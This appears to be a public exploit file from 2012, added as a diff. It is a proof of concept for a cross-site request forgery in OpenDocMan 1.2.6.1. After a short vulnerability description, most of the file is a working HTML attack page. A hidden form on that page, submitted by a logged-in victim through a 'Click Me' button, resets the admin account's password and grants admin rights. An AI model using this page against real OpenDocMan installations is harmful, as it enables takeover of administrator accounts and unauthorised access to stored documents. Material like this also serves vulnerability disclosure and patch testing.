@@ -1,0 +1,56 @@
+# Exploit Title: OpenDocMan Password Change CSRF
+# Date: 22/08/2012
+# Exploit Author: Shai rod (@NightRang3r)
+# Vendor Homepage: http://www.opendocman.com/
+# Software Link: https://github.com/downloads/opendocman/opendocman/opendocman-1.2.6.1.tar.gz
+# Version: 1.2.6.1
+
+#Gr33Tz: @aviadgolan , @benhayak, @nirgoldshlager, @roni_bachar
+
+<html>
+<head>
+<title>OpenDocMan v1.2.6.1 Password Change CSRF</title>
+</head>
+  <body>
+  <pre>
+
+About the Application:
+======================
+
+OpenDocMan is a free, open source web-based PHP document management system (DMS) designed to comply with ISO 17025 and OIE standard for 
+document management. It features web based access, fine grained control of access to files, and automated install and upgrades.
+
+Vulnerability Details:
+======================
+
+OpenDocMan is vulnerable to a CSRF which allows an attacker to change users password and profile details.
+In order to change user details the attacker must know the user id, for example; the default id for the "admin" user is 1.
+The victim must be logged in while clicking the malicious link.
+
+
+<center>
+<h2>Change Admin Password</h2>
+</center>
+</pre>
+<center>
+    <form action="http://10.0.0.12/open/user.php" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="caller" value="/open/profile.php" />
+      <input type="hidden" name="id" value="1" />
+      <input type="hidden" name="last_name" value="Admin" />
+      <input type="hidden" name="first_name" value="Admin" />
+      <input type="hidden" name="username" value="admin" />
+      <input type="hidden" name="phonenumber" value="
+" />
+      <input type="hidden" name="password" value="qwe123" />
+      <input type="hidden" name="Email" value="admin@example.com" />
+      <input type="hidden" name="department" value="1" />
+      <input type="hidden" name="admin" value="1" />
+      <input type="hidden" name="department_review[]" value="1" />
+      <input type="hidden" name="set_password" value="0" />
+      <input type="hidden" name="submit" value="Update User" />
+      <input type="submit" value="Click Me" />
+    </form>
+	</center>
+  </body>
+</html>
+
